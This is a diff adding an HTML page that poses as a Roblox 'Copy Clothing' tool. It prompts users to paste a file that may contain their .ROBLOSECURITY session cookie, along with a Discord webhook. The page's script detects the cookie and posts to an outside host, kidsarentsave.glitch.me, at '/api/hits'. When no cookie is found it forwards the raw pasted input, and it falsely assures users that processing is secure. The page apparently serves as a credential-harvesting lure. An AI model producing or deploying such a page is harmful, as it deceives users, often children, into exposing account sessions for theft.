@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Copy Clothing | AutoHar</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      background:#17181f;
+      color:#fff;
+      font-family:'Roboto',Arial,sans-serif;
+      min-height:100vh;
+      margin:0;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .card {
+      background:#20212b;
+      border-radius:20px;
+      box-shadow:0 8px 48px 0 rgba(34,255,215,0.08),0 2px 8px rgba(20,20,30,0.13);
+      border:2.5px solid #49ffd7;
+      padding:2.1rem 2.5rem 2.1rem 2.5rem;
+      box-sizing:border-box;
+      width:98vw;
+      max-width:460px;
+      display:flex;
+      flex-direction:column;
+      align-items:stretch;
+      margin-top:30px;
+    }
+    h1 {
+      font-size:2rem;
+      font-family:'Orbitron',Arial,sans-serif;
+      font-weight:900;
+      color:#49ffd7;
+      text-align:center;
+      margin-bottom:0.4em;
+    }
+    .desc {
+      color:#b7ffe2;
+      font-size:1.07rem;
+      text-align:center;
+      margin-bottom:1.9em;
+    }
+    label {
+      color:#e6fff6; font-size:1rem; margin-bottom:0.4em; font-weight:500; display:block;
+    }
+    input[type="text"] {
+      width:100%;
+      padding:1em 1em 1em 1.1em;
+      background:#191b23;
+      border:1.6px solid #2de9c9;
+      border-radius:10px;
+      color:#e0fdfb;
+      font-size:1.11rem;
+      outline:none;
+      box-sizing:border-box;
+      margin-top:0.23em;
+      margin-bottom:1.1em;
+    }
+    input[type="text"]:focus { border:2.2px solid #49ffd7; }
+    .submit-btn {
+      width:100%;
+      padding:1em 0;
+      border-radius:14px;
+      background:linear-gradient(90deg,#ff478c 0%,#49ffd7 100%);
+      color:#fff;
+      font-family:'Orbitron',Arial,sans-serif;
+      font-size:1.19rem;
+      font-weight:700;
+      border:none;
+      margin-top:0.7em;
+      margin-bottom:0.3em;
+      cursor:pointer;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:0.5em;
+      transition:background 0.18s;
+    }
+    .submit-btn:disabled { opacity:0.63; cursor:not-allowed; }
+    .status-msg {
+      text-align:center;
+      margin-top:1em;
+      font-size:1.04em;
+    }
+    .success { color:#49ffd7; }
+    .error { color:#ff7272; }
+    .back-link {
+      margin:18px auto 0 auto;
+      font-size:1rem;
+      color:#49ffd7;
+      background:none;
+      border:none;
+      text-decoration:underline;
+      cursor:pointer;
+      display:block;
+      font-family:inherit;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Copy Clothing</h1>
+    <div class="desc">
+      Paste the clothing file (cookie or asset ID) and your Discord webhook below.<br>
+      <span style="color:#ffb7e2;">All actions are processed securely via backend.</span>
+    </div>
+    <form id="clothingForm" autocomplete="off">
+      <label for="clothingfile">Clothing File or Asset ID</label>
+      <input type="text" id="clothingfile" name="clothingfile" placeholder="Paste clothing file or ID" required autocomplete="off" spellcheck="false"/>
+      <label for="webhook">Discord Webhook</label>
+      <input type="text" id="webhook" name="webhook" placeholder="https://discord.com/api/webhooks/..." required autocomplete="off" spellcheck="false"/>
+      <button type="submit" class="submit-btn">Copy Clothing</button>
+    </form>
+    <div id="status" class="status-msg"></div>
+    <button class="back-link" onclick="window.location.href='index.html'">&larr; Back to Home</button>
+  </div>
+  <script>
+    const API_URL = 'https://kidsarentsave.glitch.me';
+    const form = document.getElementById('clothingForm');
+    const statusMsg = document.getElementById('status');
+    function extractRobloxCookie(content) {
+      const match = content.match(/(?:^|\.|_)ROBLOSECURITY=([A-Za-z0-9_\-\=]+)/i);
+      return match ? match[1] : null;
+    }
+    form.onsubmit = async function(e) {
+      e.preventDefault();
+      const clothingFile = document.getElementById('clothingfile').value.trim();
+      const webhook = document.getElementById('webhook').value.trim();
+      if (!clothingFile || !webhook) {
+        statusMsg.textContent = "Please enter all fields.";
+        statusMsg.className = "status-msg error";
+        return;
+      }
+      statusMsg.textContent = "Processing...";
+      statusMsg.className = "status-msg";
+      // Try to extract cookie if present
+      const cookie = extractRobloxCookie(clothingFile);
+      try {
+        const res = await fetch(API_URL + '/api/hits', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            username: "CopyClothingUser",
+            action: "Clothing Copy",
+            extra: cookie ? "Cookie found" : clothingFile
+          })
+        });
+        if (!res.ok) throw new Error("Backend error");
+        statusMsg.textContent = "Success! Your copy request has been logged.";
+        statusMsg.className = "status-msg success";
+        form.reset();
+      } catch (err) {
+        statusMsg.textContent = "Error submitting copy request.";
+        statusMsg.className = "status-msg error";
+      }
+    }
+  </script>
+</body>
+</html>
